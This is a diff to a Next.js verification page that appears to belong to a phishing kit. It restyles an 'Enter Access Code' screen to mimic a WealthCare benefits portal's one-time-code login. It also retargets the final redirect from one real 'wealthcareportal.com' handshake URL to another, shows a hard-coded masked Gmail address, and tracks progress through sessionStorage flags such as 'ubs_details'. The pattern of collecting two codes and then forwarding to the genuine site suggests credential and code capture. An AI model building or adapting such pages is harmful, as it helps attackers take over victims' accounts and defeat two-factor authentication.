@@ -2,11 +2,12 @@
 
 import { Suspense, useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
+import { Check, Info, Lock, Mail, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
+import { VerificationHeader } from "@/components/verification-header";
 
-const ALIGHT_REDIRECT_URL =
-  "https://flores247.wealthcareportal.com/Authentication/Handshake";
+const PEAK1_REDIRECT_URL =
+  "https://peak1.wealthcareportal.com/Authentication/Handshake";
 
 function EnterCodeContent() {
   const [code, setCode] = useState("");
@@ -17,9 +18,30 @@ function EnterCodeContent() {
   const [errorMessage, setErrorMessage] = useState("");
   const [isCooldown, setIsCooldown] = useState(false);
   const [cooldownSeconds, setCooldownSeconds] = useState(0);
+  const [verificationEmail, setVerificationEmail] = useState<string>(
+    "m**********r8@gmail.com",
+  );
+  const [verificationMethod, setVerificationMethod] = useState<
+    "email" | "text"
+  >("email");
   const router = useRouter();
   const searchParams = useSearchParams();
   const isSecondOtp = searchParams.get("step") === "2";
+
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+
+    const storedEmail = sessionStorage.getItem("verification_email");
+    const storedMethod = sessionStorage.getItem("verification_method") as
+      | "email"
+      | "text"
+      | null;
+
+    if (storedEmail) setVerificationEmail(storedEmail);
+    if (storedMethod === "email" || storedMethod === "text") {
+      setVerificationMethod(storedMethod);
+    }
+  }, []);
 
   useEffect(() => {
     if (typeof window === "undefined") return;
@@ -112,7 +134,7 @@ function EnterCodeContent() {
 
     await new Promise((r) => setTimeout(r, 1000));
     if (isSecondOtp) {
-      window.location.href = ALIGHT_REDIRECT_URL;
+      window.location.href = PEAK1_REDIRECT_URL;
     } else {
       if (typeof window !== "undefined")
         sessionStorage.setItem("ubs_details", "1");
@@ -137,41 +159,47 @@ function EnterCodeContent() {
   };
 
   return (
-    <div className="min-h-screen bg-white">
-      <SiteHeader />
-      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
-        <div className="mb-6">
-          <h2 className="text-base font-medium text-gray-900 mb-4">
-            Verify It's You
-          </h2>
-          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
-            Enter Access Code
-          </h1>
-          <p className="text-gray-700 text-sm mb-4">
-            Enter the code that was sent to you.
+    <div className="min-h-screen bg-[#f3f3f1]">
+      <VerificationHeader />
+
+      <div className="mx-auto w-full max-w-[1280px] px-4 py-10 md:py-12">
+        <div className="ml-0 md:ml-[150px] w-[420px]">
+          <div className="mb-5 flex justify-center md:justify-center">
+            <Lock className="h-8 w-8" />
+          </div>
+
+          <p className="mb-4 w-[360px] text-[13px] text-center leading-[1.65rem] text-[#494949]">
+            An e-mail has been sent to the following address:
+          </p>
+
+          {/* <p className="mt-3 mb-4 text-[15px] font-normal tracking-wide text-[#2d2d2d]">
+            {verificationEmail}
+          </p> */}
+
+          <p className="text-[13px] text-center text-[#494949]">
+            Enter the verification code that you received via{" "}
+            {verificationMethod === "email" ? "Email" : "Text"} below:
+          </p>
+
+          <p className="mt-2 text-[15px] text-center text-[#494949]">
+            Note - Do not share your verification code with anyone else.
           </p>
 
           {errorMessage && (
-            <div className="mb-4 px-3 py-2 bg-red-50 border border-red-200 rounded-md">
-              <p className="text-red-600 text-sm font-medium">{errorMessage}</p>
+            <div className="mt-4 mb-3 rounded-md border border-red-200 bg-red-50 px-3 py-2">
+              <p className="text-sm font-medium text-red-600">{errorMessage}</p>
             </div>
           )}
 
-          <div className="flex items-center gap-2 mb-4">
-            <span className="text-gray-700 text-sm">Didn't receive code?</span>
-            <button
-              type="button"
-              onClick={handleResend}
-              disabled={isResending}
-              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
-            >
-              {isResending ? "Loading..." : "Resend code"}
-            </button>
-          </div>
-        </div>
+          <div className="mt-6 flex items-center gap-3">
+            <div className="flex h-8 w-8 items-center justify-center text-[#2d2d2d]">
+              <Mail className="h-5 w-5" strokeWidth={1.8} />
+            </div>
 
-        <div className="space-y-4">
-          <div>
+            <label className="text-[15px] font-medium text-[#2d2d2d]">
+              Confirmation Code
+            </label>
+
             <input
               type="text"
               id="code"
@@ -181,32 +209,59 @@ function EnterCodeContent() {
                 setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
               }
               placeholder=""
-              className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
+              className="h-[42px] w-[270px] border border-[#4d4d4d] bg-white px-3 text-[15px] text-[#2d2d2d] outline-none"
               maxLength={6}
             />
           </div>
 
-          <div className="flex gap-3 mt-3">
+          <div className="mt-6 space-y-3">
             <Button
-              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
+              type="button"
               onClick={handleVerify}
               disabled={
                 code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown
               }
+              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
             >
-              {isLoading
-                ? "Loading..."
-                : isCooldown
-                  ? `Wait ${cooldownSeconds}s`
-                  : "Continue"}
+              <Check className="h-5 w-5" strokeWidth={2.5} />
+              <span>
+                {isLoading
+                  ? "Loading..."
+                  : isCooldown
+                    ? `Wait ${cooldownSeconds}s`
+                    : "CONTINUE"}
+              </span>
             </Button>
+
             <Button
+              type="button"
               variant="ghost"
-              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
               onClick={() => router.push("/verify-choice")}
+              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#d7d7d7] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-[#2d2d2d] hover:bg-[#cfcfcf]"
             >
-              Cancel
+              <X className="h-5 w-5" strokeWidth={2.2} />
+              <span>CANCEL</span>
             </Button>
+
+            <Button
+              type="button"
+              onClick={handleResend}
+              disabled={isResending}
+              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
+            >
+              <Check className="h-5 w-5" strokeWidth={2.5} />
+              <span>{isResending ? "LOADING..." : "RESEND CODE"}</span>
+            </Button>
+          </div>
+
+          <div className="mt-7 flex w-[420px] items-start gap-4 rounded-[2px] border border-[#e0d899] bg-[#e7e2a8] p-4 text-[#2d2d2d] shadow-sm">
+            <div className="mt-1 flex h-9 w-9 shrink-0 items-center justify-center rounded-full border-[2px] border-[#2d2d2d] bg-transparent">
+              <Info className="h-5 w-5" strokeWidth={2.3} />
+            </div>
+            <p className="max-w-[300px] text-[15px] leading-[1.65rem] text-[#2d2d2d]">
+              If you wish to cancel, you will be asked to enter a code the next
+              time you login or try to perform this specific function.
+            </p>
           </div>
         </div>
       </div>
